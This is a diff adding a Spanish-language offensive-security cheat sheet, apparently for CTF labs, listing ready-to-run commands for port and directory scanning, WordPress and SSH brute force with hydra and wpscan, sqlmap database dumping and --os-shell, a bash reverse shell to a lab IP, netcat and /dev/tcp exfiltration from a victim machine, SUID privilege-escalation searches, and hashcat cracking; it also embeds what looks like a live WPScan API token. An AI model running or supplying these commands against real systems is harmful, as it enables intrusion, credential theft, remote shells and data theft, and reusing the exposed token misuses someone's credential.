@@ -1,0 +1,258 @@
+==============================================================================
+                        .::: ARSENAL DE SKYW4R33X v4.0 :::.
+==============================================================================
+
+[+]------------------------[ RECONOCIMIENTO ]------------------------------[+]
+
+   [*] NMAP
+   |------
+   | > Escaneo Completo:
+   |   nmap -p- -sT -sV -A $IP
+   |
+   | > Escaneo Servicios:
+   |   nmap -p- -sC -sV $IP --open -oN targeted -oX targetedXML
+   |
+   | > Escaneo Vulns:
+   |   nmap -p- --script=vuln $IP -oN vulns
+   |
+   | > Escaneo Rápido:
+   |   nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $IP -oG allPorts
+   |
+   | > Versiones/Servicios:
+   |   nmap -sCV -p<puertos> $IP -oN targeted
+   |
+   | > Salida XML:
+   |   nmap -sCV -p<puertos> $IP -oN targeted -oX targetedXML
+   |
+   | > Generar HTML:
+   |   xsltproc targetedXML > index.html
+   |
+   | > Servidor HTTP:
+   |   python3 -m http.server 80
+
+
+   [*] FEROXBUSTER
+   |----------
+   | > Enum Direcotrios:
+   |   feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -d 10 -t 200 -x php,txt,html,php.bak,bak,tar --status-codes 200
+   |	
+   | > Escaneo de Subdominios:
+   |   feroxbuster -u $URL -w /ruta/diccionario_subdominios.txt -t 100 --status-codes 200,403 --scan-mode dns -o resultados_subdominios.txt
+   |
+   | > Manejo de Cookies para Sesiones Autenticadas:
+   |   feroxbuster -u $URL -w /ruta/diccionario.txt -t 100 --cookies "PHPSESSID=abc123; usuario=admin" --status-codes 200,403 -o resultados_cookies.txt
+   |
+
+   [*] GOBUSTER
+   |----------
+   | > Enum Directorios:
+   |   gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,txt,html,php.bak,bak,tar
+   |
+   | > Enum Subdominios:
+   |   gobuster vhost -u <http://dominio/> -w /usr/share/wordlists/seclists/Discovery/DNS/* -t 200 --append-domain -r | grep -v "400"
+   |
+   | > Solo Estado 200:
+   |   gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html -s 200 -b ''
+   |
+   | > Agregar Barra:
+   |   gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
+   |
+   | > Escaneo CGI-BIN:
+   |   gobuster dir -u $URL/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x sh,pl,cgi
+
+   [*] WFUZZ
+   |-------
+   | > Fuzzing Básico:
+   |   wfuzz -c --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt $URL/FUZZ/
+   |
+   | > Mostrar Líneas:
+   |   wfuzz -c --sl=216 --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt $URL/FUZZ/
+   |
+   | > Ocultar Líneas:
+   |   wfuzz -c --hl=216 --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt $URL/FUZZ/
+   |
+   | > Probar Extensiones:
+   |   wfuzz -c --hl=216 --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z file,html-php-txt $URL/FUZZ.FUZ2Z
+   |
+   | > Rango de Números:
+   |   wfuzz -c -t 200 -z range,1-2000 $URL/FUZZ
+
+   [*] FFUF
+   |------
+   | > Escaneo Básico:
+   |   ffuf -c -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u $URL/FUZZ --mc=200
+
+[+]------------------------[ ATAQUES WEB ]--------------------------------[+]
+
+   [*] WPSCAN (WORDPRESS)
+   |---------------------
+   | > Escaneo Básico:
+   |   wpscan --url $URL -e vp,u --random-user-agent --api-token="YGPEngK1T4kjjPz829gUhBAUGqf8r8ljYaoAFu9ZK88"
+   |
+   | > Fuerza Bruta:
+   |   wpscan --url $URL -U admin -P /usr/share/wordlists/rockyou.txt
+
+   [*] SQLMAP
+   |---------
+   | > Global
+   |   sqlmap -r pwned.txt --dbms=mysql --dump
+   |
+   | > Descubrir DBs:
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" --current-db
+   |
+   | > Descubrir Tablas:
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" -D nombre_db --tables
+   |
+   | > Volcar Tabla:
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" -D nombre_db -T nombre_tabla --dump
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" -D nombre_db -T nombre_tabla -C usuario,contraseña --dump
+   |
+   | > Con Cookies:
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" --cookie "PHPSESSID=1234567890abcdef" --dbs
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" --cookie "PHPSESSID=1234567890abcdef" -D nombre_db --tables
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" --cookie "PHPSESSID=1234567890abcdef" -D nombre_db -T nombre_tabla --columns
+   |   sqlmap -u "http://www.ejemplo.com/pagina.php" --cookie "PHPSESSID=1234567890abcdef" -D nombre_db -T nombre_tabla -C nombre_columna --dump
+   |
+   | > Shell Inversa:
+   |   sqlmap -u http://10.129.169.231/dashboard.php?search=any --cookie="PHPSESSID=1234567890abcdef"
+   |   sqlmap -u http://10.129.169.231/dashboard.php?search=al --cookie="PHPSESSID=o68e1tm9f0akeln46pcll9i27u" --os-shell
+   |   bash -c "bash -i >& /dev/tcp/10.10.15.17/4321 0>&1"
+   |   bash -c "bash -i >%26 /dev/tcp/10.10.15.17/4321 0>%261"
+
+[+]------------------------[ POST-EXPLOTACIÓN ]---------------------------[+]
+
+   [*] ESCALADA DE PRIVILEGIOS
+   |--------------------------
+   | > Buscar Archivos SUID:
+   |   find / -perm -4000 2>/dev/null
+   |
+   | > Buscar Archivos Escribibles:
+   |   find / -writable 2>/dev/null
+   |
+   | > Buscar por Nombre:
+   |   find / -name <nombre_a_buscar> 2>/dev/null
+   |
+   | > Buscar Capacidades:
+   |   getcap -r / 2>/dev/null
+   |
+   | > Monitoreo en Tiempo Real:
+   |   watch -n 1 ls -l /bin/bash
+
+[+]------------------------[ TRANSFERENCIA DE ARCHIVOS ]------------------[+]
+
+   [*] FTP
+   |------
+   | > Conectar:
+   |   ftp <IP>
+   |
+   | > Escaneo FTP con Nmap:
+   |   nmap --script ftp-* -p 21 <ip>
+   |
+   | > FTP Anónimo:
+   |   ftp://anonymous:anonymous@10.10.10.98
+   |
+   | > Descargar Todo (wget):
+   |   wget -m ftp://anonymous:anonymous@10.10.10.98
+   |   wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
+
+   [*] NETCAT & /DEV/TCP
+   |--------------------
+   | > Atacante a Víctima:
+   |   [Atacante] nc -nlvp 443 < archivo_a_compartir
+   |   [Víctima]  cat < /dev/tcp/$IP_ATACANTE/443 > archivo_recibido
+   |
+   | > Víctima a Atacante:
+   |   [Atacante] nc -nlvp 443 > archivo_recibido
+   |   [Víctima]  cat < /dev/tcp/$IP_ATACANTE/443 < archivo_a_compartir
+   |
+   | > Alternativa (sin cat):
+   |   [Víctima] less < /dev/tcp/$IP_ATACANTE/443 > archivo_recibido
+   |
+   | > Alternativa con nc:
+   |   [Atacante] nc -nlvp 443 > archivo_recibido
+   |   [Víctima]  nc $IP_ATACANTE 443 < archivo_a_compartir
+
+   [!] Importante: En la máquina víctima, usar el directorio /tmp/.
+
+[+]------------------------[ ANÁLISIS DE BINARIOS ]-----------------------[+]
+
+   [*] COMPARACIÓN
+   |--------------
+   | > Hash MD5:
+   |   md5sum <binario>
+
+   [*] GDB
+   |------
+   | > Iniciar Análisis:
+   |   gdb ./agente -q
+   |
+   | > Generar Patrón (GEF):
+   |   gef> pattern create 200
+   |
+   | > Obtener Offset:
+   |   gef> pattern offset $eip
+   |
+   | > Verificar Seguridad:
+   |   gef> checksec
+
+[+]------------------------[ UTILIDADES DIVERSAS ]------------------------[+]
+
+   [*] PHP
+   |------
+   | > Ver Código en Base64:
+   |   php://filter/convert.base64-encode/resource=contacto.php
+   |
+   | > Decodificar Base64:
+   |   echo -n '<CÓDIGO_BASE64>' | base64 -d | cat -l php
+
+[+]------------------------------[ CRACKEO ]------------------------------[+]
+
+   [*] Crackmapexec
+   |--------------
+   | > Por SMB:
+   |   crackmapexec smb $IP -u <usuario> -p <contraseña>
+   |
+   | > Por SSH:
+   |   crackmapexec ssh $IP -u <usuario/listade usuarios> -p <contraseña/lista_de_contraseña>
+
+   [*] netexec
+   |----------
+   | > Por SMB:
+   |   netexec smb $IP -u <usuario> -p <password>
+   |
+   | > Por SSH:
+   |   netexec ssh $IP -u <usuario> -p <password>
+
+   [*] Hydra
+   |--------
+   | > Escaneo SSH:
+   |   hydra -L notas_usuarios.txt -P notas_contraseñas.txt ssh://<URL> -t 4
+   |	
+   | > Fuerza Bruta WordPress
+   |   hydra -L fsocity-optimize.dic -p test 192.168.1.16 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^: Invalid username" -t 30
+   |==========================================================================  
+   |  Usa L y P mayúsculas en Hydra para cargar diccionarios de usuarios y contraseñas, respectivamente. 
+   |  Si ya tienes un usuario o una contraseña fija, usa l y p minúsculas.
+   
+   [*] Medusa
+   |---------
+   | > Escaneo:
+   |   medusa -h $IP -u users -p password -M ssh
+
+   [*] hashcat - Para romper contraseñas
+   |------------------------------------
+   | > Ejemplo:
+   |   hashcat -m 0 rosa /usr/share/wordlists/rockyou.txt
+
+   [*] Esteganografia
+   |------------------------------------
+   | > Comando para extraer datos ocultos: 
+   |   steghide --extract -sf imagen.jpg    
+   |
+   | > Comando para leer metadatos de la imagen:
+   |   exiftool imagen.jpg
+   |   
+  
+==============================================================================
+                    .::: FIN DEL ARSENAL DE SKYW4R33X :::.
+==============================================================================
